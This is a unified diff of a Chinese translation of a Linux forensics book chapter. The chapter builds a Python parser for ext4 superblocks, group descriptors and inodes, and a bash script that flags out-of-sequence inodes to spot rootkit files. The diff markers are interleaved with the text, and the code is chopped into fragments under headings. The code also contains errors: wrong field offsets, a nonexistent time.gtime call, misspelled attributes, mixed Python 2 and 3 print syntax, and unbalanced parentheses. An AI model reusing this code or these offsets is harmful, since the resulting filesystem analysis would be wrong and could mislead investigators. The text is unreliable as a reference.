+self.layout.append(['Data Blocks', self.startBlock + self.nonDataBlocks, self.endBlock])
+
+def prettyPrint(self):
+    print("")
+```
+
+### 构造函数说明
+
+构造函数中有几点可能需要解释。你会看到读取 `bgd.wide` 的行：在赋值之后，如果该语句为真（使用宽模式或 64 位模式），则会将另一个乘以 $2^1$ 或 $2^2$ 的值加到新赋值的值上。这允许将存储在 64 位文件组描述符的两个字段中的原始值正确地存储在单个值中。
 
 记住，某些块组可能缺少某些项，存在的项目顺序始终是超级块、组描述符表、保留组块、数据块位图、节点位图、节点表和数据块。在构建名为 `layout` 的列表（一个包含描述符、起始块和结束块的列表列表）之前，构造函数会检查 `Flexible Block Groups`（灵活块组）特性。
 
 作为提醒，此特性允许将灵活组的元数据存储在灵活组内的第一个块组中。由于第一个块组存储了整个灵活组的所有描述符、位图和节点，因此调整因子 `fbgAdj` 被设置为灵活组中的组数，以便向块组布局中添加正确数量的块。构造函数中使用的模运算符 (`%`) 用于确定我们是否处于灵活组的开头。一旦你理解了灵活组的计算，构造函数就变得易懂了。
 
-
-
-
-
 ```python
 # 这个函数没有解包字符串，因为
 # 它不是数字，而是一个 UUID
+
 def getU128(data, offset=0):
   return data[offset:offset+16]
 
@@ -4726,51 +5490,70 @@ def getcompatibleFeaturesList(u32):
     retList.append('Block Group Metadata Checksum') # 块组元数据校验和
   if u32 & 0x4000:
     retList.append('Large Directory') # 大目录
-  if u32 & 0x8000:
+```
+
+
+
+```python
+if u32 & 0x8000:
     retList.append('Inline Data') # 内联数据
-  if u32 & 0x10000:
+
+if u32 & 0x10000:
     retList.append('Encrypted Inodes') # 加密 Inode
-  return retList
+
+return retList
 
 def getReadOnlyCompatibleFeaturesList(u32):
   retList = []
+
   if u32 & 0x1:
     retList.append('Sparse Super') # 稀疏超级块
+
   if u32 & 0x2:
     retList.append('Large File') # 大文件
+
   if u32 & 0x4:
     retList.append('Btree Directory') # Btree 目录
+
   if u32 & 0x8:
     retList.append('Huge File') # 巨大文件
+
   if u32 & 0x10:
     retList.append('Group Descriptor Table Checksum') # 组描述表校验和
+
   if u32 & 0x20:
     retList.append('Directory Nlink') # 目录链接数
+
   if u32 & 0x40:
     retList.append('Extra Isize') # 额外 Isize
+
   if u32 & 0x80:
     retList.append('Has Snapshot') # 带有快照
+
   if u32 & 0x100:
     retList.append('Quota') # 配额
+
   if u32 & 0x200:
     retList.append('Big Alloc') # 大内存分配
+
   if u32 & 0x400:
     retList.append('Metadata Checksum') # 元数据校验和
+
   if u32 & 0x800:
     retList.append('Replica') # 副本
+
   if u32 & 0x1000:
     retList.append('Read-only') # 只读
+
   return retList
 ```
 
-"""
-此类将解析来自扩展 (ext2/ext3/ext4) Linux 文件系统的超级块中的数据。
+此类将解析来自扩展 (`ext2`/`ext3`/`ext4`) Linux 文件系统的超级块中的数据。
 截至 2015 年 7 月为最新状态。
-用法：sb.Superblock(data)，其中
-data 是一个至少 1024 字节的紧包字符串，
+用法：`sb.Superblock(data)`，其中
+`data` 是一个至少 1024 字节的紧包字符串，
 其前 1024 字节包含一个超级块。
-sb.prettyPrint() 会打印超级块中的所有字段。
-"""
+`sb.prettyPrint()` 会打印超级块中的所有字段。
 
 ```python
 class Superblock():
@@ -4835,129 +5618,324 @@ class Superblock():
         # 卷名 - 可能为空
         self.volumeName = data[0x78:0x88].split("\x00")[0]
         # 最后挂载的目录
-        self.lastMounted = data[0x88:0xc8].split("\x00")[0]
-        # 用于压缩
-        self.algorithmUsageBitmap = getU32(data, 0xc8)
-        # ext4 中不使用
-        self.preallocBlocks = getU8(data, 0xcc) # 预分配块
-        # 仅在 DIR_PREALLOC 特性下
-        self.preallocDirBlock = getU8(data, 0xcd)
-        # 预留给未来扩展的块
-        self.reservedGdtBlocks = getU16(data, 0xce)
-        # 日志超级块 UUID
-        self.journalUuid = getU128(data, 0xd0)
-        # 日志文件 inode 号
-        self.journalInode = getU32(data, 0xe0)
-        # 外部日志的设备号
-        self.journalDev = getU32(data, 0xe4)
-        # 孤立 inode 列表起始
-        self.lastOrphan = getU32(data, 0xe8)
-        self.hashSeed = []
-        # htree seed
-        self.hashSeed.append(getU32(data, 0xec))
-        self.hashSeed.append(getU32(data, 0xf0))
-        self.hashSeed.append(getU32(data, 0xf4))
-        self.hashSeed.append(getU32(data, 0xf8))
-        # 0/1/2/3/4 Linux/Hard/FreeBSD/Linux
-        self.hashVersion = getU8(data, 0xfc)
-        self.journalType = getU8(data, 0xfd)
-        # 启用 64 位描述符大小
-        self.descriptorSize = getU16(data, 0xfe)
-        self.defaultMounts = getU32(data, 0x100)
-        # 仅在 meta 特性下
-        self.firstTextBlock = getU32(data, 0x104)
-        # 文件系统创建时间
-        self.mkfsTime = time.gtime(getU32(data, 0x108))
-        self.journalBlocks = []
-        # 日志备份副本和大小
-        for i in range(17):
-            self.journalBlocks.append(getU32(data, 0x10c + i*4))
-        # 64 位模式
-        self.blockCountHi = getU32(data, 0x150)
-        self.reservedBitCount = getU32(data, 0x154)
-        self.freeBlocksHi = getU32(data, 0x158)
-        # 所有节点至少此大小
-        self.minInodeExtraSize = getU16(data, 0x15c)
-        # 新 inode 应该预留多少字节
-        self.wantInodeExtraSize = getU16(data, 0x15e)
-        # 1/2/4 有符号哈希/无符号哈希/测试代码
-        self.miscFlags = getU32(data, 0x160)
-        # 移动到下一个磁盘前读取的逻辑块数
-        self.raidStride = getU16(data, 0x164)
-        # 多次挂载检查之间的等待秒数
-        self.mpInterval = getU16(data, 0x166)
-        # MMP 数据块号
-        self.mpBlock = getU64(data, 0x168)
-        # 回到此磁盘前的读/写块数
-        self.raidStrideWidth = getU32(data, 0x170)
-        # 每个灵活组组组
-        self.groupsPerFlex = pow(2, getU8(data, 0x74))
-        # 应为 1 表示 crc32
-        self.metadataChecksumType = getU8(data, 0x175)
-        # 应为零
-        self.reservedPath = getU16(data, 0x176)
-        # 所有时间写入的千字节
-        self.kilobytesWritten = getU64(data, 0x178)
-        # 活跃快照 inode
-        self.snapshotInode = getU32(data, 0x180)
-        # 活跃快照的 ID
-        self.snapshotId = getU32(data, 0x184)
-        # 快照预留的块
-        self.snapshotReservedBlocks = getU64(data, 0x188)
-        # 快照列表头节点的 inode 号
-        self.snapshotList = getU32(data, 0x190)
 ```
 
 
 
+# ext4 超级块字段解析
+
+```python
+self.lastMounted = data[0x88:0xc8].split("\x00")[0]
+```
+
+## 用于压缩
+
+```python
+self.algorithmUsageBitmap = getU32(data, 0xc8)
+```
+
+## ext4 中不使用
+
+```python
+self.preallocBlocks = getU8(data, 0xcc) # 预分配块
+```
+
+## 仅在 DIR_PREALLOC 特性下
+
+```python
+self.preallocDirBlock = getU8(data, 0xcd)
+```
+
+## 预留给未来扩展的块
+
+```python
+self.reservedGdtBlocks = getU16(data, 0xce)
+```
+
+## 日志超级块 UUID
+
+```python
+self.journalUuid = getU128(data, 0xd0)
+```
+
+## 日志文件 inode 号
+
+```python
+self.journalInode = getU32(data, 0xe0)
+```
+
+## 外部日志的设备号
+
+```python
+self.journalDev = getU32(data, 0xe4)
+```
+
+## 孤立 inode 列表起始
+
+```python
+self.lastOrphan = getU32(data, 0xe8)
+```
+
+```python
+self.hashSeed = []
+```
+
+## htree seed
+
+```python
+self.hashSeed.append(getU32(data, 0xec))
+self.hashSeed.append(getU32(data, 0xf0))
+self.hashSeed.append(getU32(data, 0xf4))
+self.hashSeed.append(getU32(data, 0xf8))
+```
+
+## 0/1/2/3/4 Linux/Hard/FreeBSD/Linux
+
+```python
+self.hashVersion = getU8(data, 0xfc)
+self.journalType = getU8(data, 0xfd)
+```
+
+## 启用 64 位描述符大小
+
+```python
+self.descriptorSize = getU16(data, 0xfe)
+self.defaultMounts = getU32(data, 0x100)
+```
+
+## 仅在 meta 特性下
+
+```python
+self.firstTextBlock = getU32(data, 0x104)
+```
+
+## 文件系统创建时间
+
+```python
+self.mkfsTime = time.gtime(getU32(data, 0x108))
+```
+
+```python
+self.journalBlocks = []
+```
+
+## 日志备份副本和大小
+
+```python
+for i in range(17):
+    self.journalBlocks.append(getU32(data, 0x10c + i*4))
+```
+
+## 64 位模式
+
+```python
+self.blockCountHi = getU32(data, 0x150)
+self.reservedBitCount = getU32(data, 0x154)
+self.freeBlocksHi = getU32(data, 0x158)
+```
+
+## 所有节点至少此大小
+
+```python
+self.minInodeExtraSize = getU16(data, 0x15c)
+```
+
+## 新 inode 应该预留多少字节
+
+```python
+self.wantInodeExtraSize = getU16(data, 0x15e)
+```
+
+## 1/2/4 有符号哈希/无符号哈希/测试代码
+
+```python
+self.miscFlags = getU32(data, 0x160)
+```
+
+## 移动到下一个磁盘前读取的逻辑块数
+
+```python
+self.raidStride = getU16(data, 0x164)
+```
+
+## 多次挂载检查之间的等待秒数
+
+```python
+self.mpInterval = getU16(data, 0x166)
+```
+
+## MMP 数据块号
+
+```python
+self.mpBlock = getU64(data, 0x168)
+```
+
+## 回到此磁盘前的读/写块数
+
+```python
+self.raidStrideWidth = getU32(data, 0x170)
+```
+
+## 每个灵活组组组
+
+```python
+self.groupsPerFlex = pow(2, getU8(data, 0x74))
+```
+
+## 应为 1 表示 crc32
+
+```python
+self.metadataChecksumType = getU8(data, 0x175)
+```
+
+## 应为零
+
+```python
+self.reservedPath = getU16(data, 0x176)
+```
+
+## 所有时间写入的千字节
+
+```python
+self.kilobytesWritten = getU64(data, 0x178)
+```
+
+## 活跃快照 inode
+
+```python
+self.snapshotInode = getU32(data, 0x180)
+```
+
+## 活跃快照的 ID
+
+```python
+self.snapshotId = getU32(data, 0x184)
+```
+
+## 快照预留的块
+
+```python
+self.snapshotReservedBlocks = getU64(data, 0x188)
+```
+
+## 快照列表头节点的 inode 号
+
+```python
+self.snapshotList = getU32(data, 0x190)
+```
 
 ```python
 self.errorCount = getU32(data, 0x194)
-# 首次检测到错误的时间
+```
+
+## 首次检测到错误的时间
+
+```python
 self.firstErrorTime = time.gmtime(getU32(data, 0x198)
-# 罪祸 inode
+```
+
+## 罪祸 inode
+
+```python
 self.firstErrorInode = getU32(data, 0x19c)
-# 罪祸 block
+```
+
+## 罪祸 block
+
+```python
 self.firstErrorBlock = getU64(data, 0x1a0)
-# 罪祸函数
-self.firstErrorFunction = \
-data[0xa8:0x1c8].split("\x00") [0]
-# 错误发生的行号
+```
+
+## 罪祸函数
+
+```python
+self.firstErrorFunction = data[0xa8:0x1c8].split("\x00")[0]
+```
+
+## 错误发生的行号
+
+```python
 self.firstErrorLine = getU32(data, 0x18)
-# 最后检测到错误的时间
+```
+
+## 最后检测到错误的时间
+
+```python
 self.lastErrorTime = time.gmtime(getU32(data, 0x1cc))
-# 罪祸 inode
+```
+
+## 罪祸 inode
+
+```python
 self.lastErrorInode = getU32(data, 0x1d0)
-# 错误发生的行号
+```
+
+## 错误发生的行号
+
+```python
 self.lastErrorLine = getU32(data, 0x1d4)
-# 罪祸 block
+```
+
+## 罪祸 block
+
+```python
 self.lastErrorBlock = getU64(data, 0x1d8)
-# 罪祸函数
-self.lastErrorFunction = \
-data[0xe0:0x200].split("\x00") [0]
-# 以空终止字符串中的挂载选项
-self.mountOptions = \
-data[0x200:0x240].split("\x00") [0]
-# 用户配额文件的 inode
+```
+
+## 罪祸函数
+
+```python
+self.lastErrorFunction = data[0xe0:0x200].split("\x00")[0]
+```
+
+## 以空终止字符串中的挂载选项
+
+```python
+self.mountOptions = data[0x200:0x240].split("\x00")[0]
+```
+
+## 用户配额文件的 inode
+
+```python
 self.userQuotaInode = getU32(data, 0x240)
-# 组配额文件的 inode
+```
+
+## 组配额文件的 inode
+
+```python
 self.groupQuotaInode = getU32(data, 0x244)
-# 应该为零
+```
+
+## 应该为零
+
+```python
 self.overheadBlocks = getU32(data, 0x248)
-# 仅限超稀疏2
-self.backupBlockGroups = \
-[getU32(data, 0x2ca), getU32(data, 0x250)]
+```
+
+## 仅限超稀疏2
+
+```python
+self.backupBlockGroups = [getU32(data, 0x2ca), getU32(data, 0x250)]
+```
+
+```python
 self.encryptionAlgorithms = []
 for i in range(0, 4):
-    self.encryptionAlgorithms.append(
-    getU32(data, 0x254 + i*4))
+    self.encryptionAlgorithms.append(getU32(data, 0x254 + i*4))
 self.checksum = getU32(data, 0x3fc)
+```
 
+```python
 def blockGroups(self):
     bg = self.totalBlocks / self.blocksPerGroup
-    if self.totalBlocks % self.blocksPerGroup != 0:
-        bg += 1
-    return bg
+```
+
+
+
+```python
+if self.totalBlocks % self.blocksPerGroup != 0:
+    bg += 1
+return bg
 
 def groupDescriptorSize(self):
     if '64-bit' in self.incompatibleFeaturesList:
@@ -5092,45 +6070,80 @@ class GroupDescriptor():
         self.freeBlocksCount = getU16(data, 0xc)
         # 空闲 inode 计数
         self.freeInodesCount = getU16(data, 0xe)
-        # EXT4 标志
-        self.flags = getU16(data, 0x10)
-        # 空闲标志列表
-        self.freeFlagList = self.printFlagList()
-        # 快照排除位图
-        self.excludeBitmapLo = getU32(data, 0x14)
-        # crc32c (s_uuid+grp_num+bbitmap) LE
-        self.blockBitmapSum = getU16(data, 0x18)
-        # crc32c (s_uuid+grp_num+bbitmap) LE
-        self.inodeBitmapSum = getU16(data, 0x1a)
-        # 空闲 inode 计数
-        self.itableUnusedLo = getU16(data, 0x1c)
-        # crc16 (sb_uuid+group)
-        self.checksum = getU16(data, 0x1e)
-        if wide:
-            # 块位高位
-            self.blockBitmapHi = getU32(data, 0x20)
-            # inode 位图高位
-            self.inodeBitmapHi = getU32(data, 0x24)
-            # inode 表块高位
-            self.inodeTableHi = getU32(data, 0x28)
-            # 空闲块计数高位
-            self.freeBlocksCountHi = getU16(data, 0x2c)
-            # 空闲 inode 计数高位
-            self.freeInodesCountHi = getU16(data, 0x2e)
-            # 目录计数高位
-            self.usedDirsCountHi = getU16(data, 0x30)
-            # 空闲 inode 计数高位
-            self.itableUnusedHi = getU16(data, 0x32)
-            # 排除位图高位
-            self.excludeBitmapHi = getU32(data, 0x34)
 ```
 
 
+
+# EXT4 标志
+
+`self.flags = getU16(data, 0x10)`
+
+## 空闲标志列表
+
+`self.freeFlagList = self.printFlagList()`
+
+## 快照排除位图
+
+`self.excludeBitmapLo = getU32(data, 0x14)`
+
+## crc32c (s_uuid+grp_num+bbitmap) LE
+
+`self.blockBitmapSum = getU16(data, 0x18)`
+
+## crc32c (s_uuid+grp_num+bbitmap) LE
+
+`self.inodeBitmapSum = getU16(data, 0x1a)`
+
+## 空闲 inode 计数
+
+`self.itableUnusedLo = getU16(data, 0x1c)`
+
+## crc16 (sb_uuid+group)
+
+`self.checksum = getU16(data, 0x1e)`
+
+if `wide`:
+
+### 块位高位
+
+`self.blockBitmapHi = getU32(data, 0x20)`
+
+### inode 位图高位
+
+`self.inodeBitmapHi = getU32(data, 0x24)`
+
+### inode 表块高位
+
+`self.inodeTableHi = getU32(data, 0x28)`
+
+### 空闲块计数高位
+
+`self.freeBlocksCountHi = getU16(data, 0x2c)`
+
+### 空闲 inode 计数高位
+
+`self.freeInodesCountHi = getU16(data, 0x2e)`
+
+### 目录计数高位
+
+`self.usedDirsCountHi = getU16(data, 0x30)`
+
+### 空闲 inode 计数高位
+
+`self.itableUnusedHi = getU16(data, 0x32)`
+
+### 排除位图高位
+
+`self.excludeBitmapHi = getU32(data, 0x34)`
+
 ```python
 self.blockBitmapCsumHi=getU16(data, 0x38)
+
 /* crc32c(s_uid+grp_num+ibitmap) BE */
 self.inodeBitmapCsumHi=getU16(data, 0x3a)
+
 self.reserved=getU32(data, 0x3c)
+
 def printFlagList(self):
     flagList = []
     # inode table and bitmap are not initialized (EXT4_BG_INODE_UNINIT)
@@ -5143,13 +6156,14 @@ def printFlagList(self):
     if self.flags & 0x4:
         flagList.append('Inode Zeroed')
     return flagList
+
 def prettyPrint(self):
     for k, v in sorted(self.__dict__.items()):
         print(k+":=", v)
 ```
 
 该类结合了块组描述符（block group descriptor）和超级块（superblock）的信息，以完整描述块组。信息更新至 2015 年 7 月。
-用法示例：`egd = ExtendedGroupDescriptor(bgd, sb, bgNo)`，其中 bgd 是 `GroupDescriptor` 对象，sb 是 `Superblock` 对象，bgNo 是块组编号。
+用法示例：`egd = ExtendedGroupDescriptor(bgd, sb, bgNo)`，其中 `bgd` 是 `GroupDescriptor` 对象，`sb` 是 `Superblock` 对象，`bgNo` 是块组编号。
 `egd.prettyPrint()` 会打印块组的各种统计数据及其布局。
 
 ```python
@@ -5164,7 +6178,6 @@ class ExtendedGroupDescriptor():
         self.freeInodes = bgd.freeInodesCount
         if bgd.wide:
             self.freeInodes += bgd.freeInodesCountHi * pow(2, 16)
-
         self.freeBlocks = bgd.freeBlocksCountLo
         if bgd.wide:
             self.freeBlocks += bgd.freeBlocksCountHi * pow(2, 16)
@@ -5191,56 +6204,71 @@ class ExtendedGroupDescriptor():
                 self.layout.append(['Superblock', self.startBlock, self.startBlock])
                 gdSize = sb.groupDescriptorSize() * sb.blockGroups() / \
                     self.blockSize
-                self.layout.append(['Group Descriptor Table',
-                    self.startBlock + 1, self.startBlock + gdSize])
-                self.nonDataBlocks += gdSize + 1
-                if sb.reserveddtBlocks > 0:
-                    self.layout.append(['Reserved GDT Blocks',
-                            self.startBlock + gdSize + 1,
-                            self.startBlock + gdSize + sb.reserveddtBlocks])
-                    self.nonDataBlocks += sb.reserveddtBlocks
-        bbm = bgd.blockBitmapLo
-        if bgd.wide:
-            bbm += bgd.blockBitmapHi * pow(2, 16)
-        self.layout.append(['Data Block Bitmap', bbm])
-        # is block bitmap in this group (not flex group, etc)
-        if sb.groupFromBlock(bbm) == bgNo:
-            self.nonDataBlocks += fbgAdj
-        ibm = bgd.inodeBitmapMap
-        if bgd.wide:
-            ibm += bgd.inodeBitmapHi * pow(2, 32)
-        self.layout.append(['Inode Bitmap', ibm])
-        # is inode bitmap in group?
-        if sb.groupFromBlock(ibm) == bgNo:
-            self.nonDataBlocks += fbgAdj
-        it = bgd.inodeTableLo
-        if bgd.wide:
-            it += bgd.inodeTableHi * pow(2, 32)
-        itBlocks = (sb.inodesPerGroup * sb.inodeSize) / sb.blockSize
-        self.layout.append(['Inode Table', it, it + itBlocks - 1])
-        # is inode table in group?
-        if sb.groupFromBlock(it) == bgNo:
-            self.nonDataBlocks += itBlocks * fbgAdj
-        self.layout.append(['Data Blocks', self.startBlock + nonDataBlocks, self.endBlock])
-
-    def prettyPrint(self):
-        print 'Block Group: %s' % self.blockGroup
-        print 'Flags: %s' % self.flags
-        print 'Blocks: %s - %s' % (self.startBlock, self.endBlock)
-        print 'Inodes: %s - %s' % (self.startInode, self.endInode)
-        print 'Layout:'
-        for item in self.layout:
-            print ' %s %s %s' % (item[0], item[1], item[2])
-        print 'Free Inodes: %u' % self.freeInodes
-        print 'Free Blocks: %u %u' % self.freeBlocks
-        print 'Directories: %u %u' % self.directories
-        print 'Checksum: 0x %x' % self.checksum
-        print 'Block Bitmap Checksum: 0x %x' % self.blockBitmapChecksum
-        print 'Inode Bitmap Checksum: 0x %x' % self.inodeBitmapChecksum
 ```
 
-该类读取包含 Linux 扩展（ext2/ext3/ext4）系统的镜像超级块和块组描述符，并以组织的方式存储文件元数据。信息更新至 2015 年 7 月。
-用法：`emd = ExtMetadata(filename, offset)`，其中 `filename` 是原始镜像文件，`offset` 是从文件开始到扩展文件第一个扇区的512字节偏移量。
+
+
+### 代码片段
+
+```python
+self.layout.append(['Group Descriptor Table',
+    self.startBlock + 1, self.startBlock + gdSize])
+self.nonDataBlocks += gdSize + 1
+if sb.reserveddtBlocks > 0:
+    self.layout.append(['Reserved GDT Blocks',
+        self.startBlock + gdSize + 1,
+        self.startBlock + gdSize + sb.reserveddtBlocks])
+    self.nonDataBlocks += sb.reserveddtBlocks
+
+bbm = bgd.blockBitmapLo
+if bgd.wide:
+    bbm += bgd.blockBitmapHi * pow(2, 16)
+self.layout.append(['Data Block Bitmap', bbm])
+# is block bitmap in this group (not flex group, etc)
+if sb.groupFromBlock(bbm) == bgNo:
+    self.nonDataBlocks += fbgAdj
+
+ibm = bgd.inodeBitmapMap
+if bgd.wide:
+    ibm += bgd.inodeBitmapHi * pow(2, 32)
+self.layout.append(['Inode Bitmap', ibm])
+# is inode bitmap in group?
+if sb.groupFromBlock(ibm) == bgNo:
+    self.nonDataBlocks += fbgAdj
+
+it = bgd.inodeTableLo
+if bgd.wide:
+    it += bgd.inodeTableHi * pow(2, 32)
+itBlocks = (sb.inodesPerGroup * sb.inodeSize) / sb.blockSize
+self.layout.append(['Inode Table', it, it + itBlocks - 1])
+# is inode table in group?
+if sb.groupFromBlock(it) == bgNo:
+    self.nonDataBlocks += itBlocks * fbgAdj
+
+self.layout.append(['Data Blocks', self.startBlock + nonDataBlocks, self.endBlock])
+
+def prettyPrint(self):
+    print 'Block Group: %s' % self.blockGroup
+    print 'Flags: %s' % self.flags
+    print 'Blocks: %s - %s' % (self.startBlock, self.endBlock)
+    print 'Inodes: %s - %s' % (self.startInode, self.endInode)
+    print 'Layout:'
+    for item in self.layout:
+        print ' %s %s %s' % (item[0], item[1], item[2])
+    print 'Free Inodes: %u' % self.freeInodes
+    print 'Free Blocks: %u %u' % self.freeBlocks
+    print 'Directories: %u %u' % self.directories
+    print 'Checksum: 0x %x' % self.checksum
+    print 'Block Bitmap Checksum: 0x %x' % self.blockBitmapChecksum
+    print 'Inode Bitmap Checksum: 0x %x' % self.inodeBitmapChecksum
+```
+
+### 说明
+
+该类读取包含 Linux 扩展（`ext2`/`ext3`/`ext4`）系统的镜像超级块和块组描述符，并以组织的方式存储文件元数据。信息更新至 2015 年 7 月。
+
+用法：`emd = ExtMetadata(filename, offset)`，其中 `filename` 是原始镜像文件，`offset` 是从文件开始到扩展文件第一个扇区的 512 字节偏移量。
+
 `emd.prettyPrint()` 将打印超级块信息并遍历每个块组打印统计数据和布局。
 
 ```python
@@ -5276,22 +6304,37 @@ class ExtMetadata():
         self.superblock.prettyPrint()
         for bgd in self.bgdList:
             bgd.prettyPrint()
+```
 
+
+
+```python
 def usage():
+
     print("usage " + sys.argv[0] + " <image file> +offset in sectors\nReads superblock from an image file")
+
     exit(1)
 
 def main():
+
     if len(sys.argv) < 3:
+
         usage()
+
     # read first sector
+
     if not os.path.isfile(sys.argv[1]):
+
         print("File " + sys.argv[1] + " cannot be opened for reading")
+
         exit(1)
+
     emd = ExtMetadata(sys.argv[1], sys.argv[2])
+
     emd.prettyPrint()
 
 if __name__ == "__main__":
+
     main()
 ```
 
@@ -5299,16 +6342,13 @@ if __name__ == "__main__":
 
 运行该脚本针对 PFE 系统的部分结果在图 7.13、图 7.14 和图 7.15 中所示。在图 7.13 中，我们看到使用了灵活组（flexible groups）。图中未显示大小为 16 的灵活块组。在图 7.14 中，显示了第一个组。如往常，它包含超级块和块组描述符（包括用于未来扩展的预留块）。你会注意到数据位图和节点位图之间有 16 个块，节点位图和节点表之间也是如此。
 
-
-
-
 通过此命令，你将看到所有这些备份超级块和组描述符表都在正确的位置。
 
 ![](img/7abfab28a493757db3f096946a95ec01_247_0.png)
 
 图 7.15
 
-在 PFE 目标系统上运行 extfs.py 脚本的结果 – 第 3 部分。
+在 PFE 目标系统上运行 `extfs.py` 脚本的结果 – 第 3 部分。
 
 在我们进入下一个新话题之前，我认为我应该指出，我们仅仅触及了这个脚本中类所能做到的冰一角。例如，这些类可以很容易地用于计算给定 inode 或数据块的镜像的偏移量。它也可以被用于从偏移量反推，以确定任何特定扇区中存储了什么。现在，我们已经学习了扩展文件系统的所有基础知识，并将开始讨论如何检测攻击者的行为，即使他或她修改了文件系统上的时间戳。
 
@@ -5332,7 +6372,7 @@ if __name__ == "__main__":
 
 `ls` 命令支持几种基本的排序。默认排序是字母顺序，但它还会按扩展名、大小、时间和版本进行排序。命令 `ls -alir <directory>-sort=size` 将对目录进行递归（`-R`）列出，并按大小（从大到小）进行排序。运行 `ls -alir bin -sort=size` 的部分结果如图 7.17 所示。
 
-# 图 7.17
+## 图 7.17
 
 在 PFE 目标镜像上运行 `ls -alir bin -sort=size` 的部分结果。
 
@@ -5342,15 +6382,25 @@ if __name__ == "__main__":
 
 ```
 total 56
+
 -drwxr-xr-x 4 root root 4096 Feb 12 12:21 ..
+
 12 ..
+
 -drwxr-xr-x 4 root root 4096 Feb 12 12:21 ..
+
 2 ..
+
 -drwxr-xr-x 4 root root 4096 Feb 12 12:21 ..
+
 2 ..
+
 -rw-r--r-- 1 root root    0 Feb 12 12:21 file_a
+
 -rw-r--r-- 1 root root    0 Feb 12 12:21 file_b
+
 -rw-r--r-- 1 root root    0 Feb 12 12:21 file_c
+
 -rw-r--r-- 1 root root    0 Feb 12 12:21 file_d
 ```
 
@@ -5358,52 +6408,79 @@ total 56
 #!/bin/bash
 
 usage () {
+
   echo "Usage: $0 <path>"
+
   exit 1
+
 }
 
 if [ $# -lt 1 ]; then
+
   usage
+
 fi
 
 temp=/tmp/ls.txt
+
 ls -ali $1 | sort -n > $temp
 
 foundinode=false
+
 declare -i startinode
+
 while read line
+
 do
+
   if [ "$foundinode" = false ] && [ "$(echo "$line" | wc -w)" -gt 6 ]; then
+
     startinode=$(echo "$line" | awk '{print $1}')
+
     foundinode=true
+
   fi
+
   q=$(echo "$line" | awk '{print $1}')
+
   if [[ $q =~ ^[0-9]+$ ]] && [ "$startinode" -lt $q ]; then
+
     if [ $((startinode + 1)) -lt $q ]; then
+
       echo -e "\e[31m*Out of sequence detected: $startinode got $q\e[0m"
+
     else
+
       echo -e "\e[31m*Out of sequence detected: $startinode got $q\e[0m"
+
     fi
+
   else
+
     startinode=$(echo "$line" | awk '{print $1}')
+
   fi
+
   echo "$line"
+
   startinode=$((startinode+1))
+
 done < $temp
+
 rm $temp
 ```
 
+
+
 该脚本以通常的 shebang 开始，后面是一个在没有传递命令行参数时调用的 `usage` 函数。为了提高性能并使脚本更简单，`ls -ali <directory> | sort -n` 的输出被发送到一个临时文件。创建了两个变量 `foundinode` 和 `startinode`。这创建了一个整数类型的变量。还将该变量初始化为零。我们稍后会在脚本中解释为什么要这样做。
 
-
-
-值可以像这样增加。当循环退出时，临时文件会被删除。在 PFE 目标系统的 /bin 目录上运行此脚本的部分结果如图 7.19 所示。注意根文件之前的红色警告。
+值可以像这样增加。当循环退出时，临时文件会被删除。在 PFE 目标系统的 `/bin` 目录上运行此脚本的部分结果如图 7.19 所示。注意根文件之前的红色警告。
 
 ![](img/7abfab28a493757db3f096946a95ec01_253_0.png)
 
 图 7.19
 
-在 PFE 目标系统的 /bin 目录上运行 out-of-seq-inode.sh 的部分结果。注意针对 rootkit 文件的警告。
+在 PFE 目标系统的 `/bin` 目录上运行 `out-of-seq-inode.sh` 的部分结果。注意针对 rootkit 文件的警告。
 
 ### INODES（索引节点）
 
@@ -5511,52 +6588,59 @@ inode 块数组中的数据块。
 
 ## 使用 Python 读取 inode
 
-我们再次转向 Python 以方便地解释 inode 数据。为了实现这一点，我们将一个新的 Inode 类添加到到我们不断扩展的 extfs.py 文件中。以下是新类和辅助函数。
+我们再次转向 Python 以方便地解释 inode 数据。为了实现这一点，我们将一个新的 `Inode` 类添加到到我们不断扩展的 `extfs.py` 文件中。以下是新类和辅助函数。
 
 ```
 ```
- 辅助函数用于解析存储在 inode 中的模式位向量。它接受一个 16 位的模式
-位向量并返回一个字符串列表。
+辅助函数用于解析存储在 inode 中的模式位向量。它接受一个 16 位的模式位向量并返回一个字符串列表。
 ```
+```python
 def getInodeModes(mode):
-retVal = []
-if mode & 0x1:
-retVal.append("Others Exec")
-if mode & 0x2:
-retVal.append("Others Write")
-if mode & 0x4:
+    retVal = []
+    if mode & 0x1:
+        retVal.append("Others Exec")
+    if mode & 0x2:
+        retVal.append("Others Write")
+    if mode & 0x4:
 ```
-
-
-
-
 ```python
 retVal.append("Others Read")
 if mode & 0x8:
     retVal.append("Group Exec")
 if mode & 0x10:
-    retVal.append("Group Write")
-if mode & 0x20:
-    retVal.append("Group Read")
-if mode & 0x40:
-    retVal.append("Owner Exec")
-if mode & 0x80:
-    retVal.append("Owner Write")
-if mode & 0x100:
-    retVal.append("Owner Read")
-if mode & 0x200:
-    retVal.append("Sticky Bit")
-if mode & 0x400:
-    retVal.append("Set GID")
-if mode & 0x800:
-    retVal.append("Set UID")
-return retVal
 ```
 
-"""
+
+
+`retVal.append("Group Write")`
+
+`if mode & 0x20:`
+    `retVal.append("Group Read")`
+
+`if mode & 0x40:`
+    `retVal.append("Owner Exec")`
+
+`if mode & 0x80:`
+    `retVal.append("Owner Write")`
+
+`if mode & 0x100:`
+    `retVal.append("Owner Read")`
+
+`if mode & 0x200:`
+    `retVal.append("Sticky Bit")`
+
+`if mode & 0x400:`
+    `retVal.append("Set GID")`
+
+`if mode & 0x800:`
+    `retVal.append("Set UID")`
+
+`return retVal`
+
+### 解析 inode 模式位向量获取文件类型
+
 此辅助函数解析存储在 inode 中的模式位向量，以获取文件类型。
 它接受一个 16 位的模式位向量并返回一个字符串。
-"""
 
 ```python
 def getInodeFileType(mode):
@@ -5577,11 +6661,13 @@ def getInodeFileType(mode):
         return "Socket"
     else:
         return "Unknown Filetype"
-"""
-"""
+```
+
+### 解析 inode 标志位向量
+
 此辅助函数解析存储在 inode 中的标志位向量。
 它接受一个 32 位的标志位向量并返回一个字符串列表。
-"""
+
 ```python
 def getInodeFlags(flags):
     retVal = []
@@ -5647,7 +6733,6 @@ def getInodeFlags(flags):
 ```
 
 此辅助函数将 inode 号转换为块组（block group）以及该块组中的索引。
-
 用法：`[bg, index] = getInodeLoc(inodeNo, inodesPerGroup)`
 
 ```python
@@ -5657,8 +6742,11 @@ def getInodeLoc(inodeNo, inodesPerGroup):
     return [bg, index]
 ```
 
